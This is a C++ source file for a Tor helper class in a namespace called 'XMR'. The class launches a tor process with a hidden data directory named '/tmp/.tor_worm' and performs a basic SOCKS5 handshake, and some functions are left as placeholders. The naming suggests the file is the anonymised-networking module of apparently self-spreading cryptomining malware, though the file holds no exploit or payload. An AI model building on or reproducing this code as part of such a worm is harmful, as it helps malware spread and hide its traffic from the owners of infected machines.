#include "../../include/network/tor_handler.h"
#include <cstring>
#include <iostream>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#define close closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif
#include <atomic>
#include <cstdint>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <functional>
#include <stdexcept>
#include <map>



namespace XMR {

TorHandler::TorHandler(const std::string &socks5_host, int socks5_port)
    : m_host(socks5_host), m_port(socks5_port), m_tor_pid(-1) {}

bool TorHandler::start_tor_process() {
#ifdef __linux__
  m_tor_pid = fork();
  if (m_tor_pid == 0) {
    execlp("tor", "tor", "--SocksPort", std::to_string(m_port).c_str(),
           "--DataDirectory", "/tmp/.tor_worm", nullptr);
    exit(1);
  }
  return m_tor_pid > 0;
#else
  return false;
#endif
}

bool TorHandler::stop_tor_process() {
#ifdef __linux__
  if (m_tor_pid > 0) {
    kill(m_tor_pid, SIGTERM);
    m_tor_pid = -1;
    return true;
  }
#endif
  return false;
}

bool TorHandler::is_tor_running() {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0)
    return false;
  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(m_port);
  addr.sin_addr.s_addr = inet_addr(m_host.c_str());
  int ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
  close(sock);
  return ret == 0;
}

bool TorHandler::create_tor_socket(int &socket_fd) {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0)
    return false;

  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(m_port);
  addr.sin_addr.s_addr = inet_addr(m_host.c_str());

  if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    close(sock);
    return false;
  }

  if (!socks5_handshake(sock)) {
    close(sock);
    return false;
  }

  socket_fd = sock;
  return true;
}

void TorHandler::set_new_identity() {
  // Not implemented
}

bool TorHandler::socks5_handshake(int fd) {
  unsigned char handshake[] = {0x05, 0x01, 0x00};
  if (send(fd, reinterpret_cast<const char*>(handshake), sizeof(handshake), 0) != sizeof(handshake))
    return false;
  unsigned char resp[2];
  if (recv(fd, reinterpret_cast<char*>(resp), 2, 0) != 2)
    return false;
  return resp[0] == 0x05 && resp[1] == 0x00;
}

bool TorHandler::socks5_connect(int fd, const std::string &host, int port) {
  // Placeholder
  return false;
}

} // namespace XMR
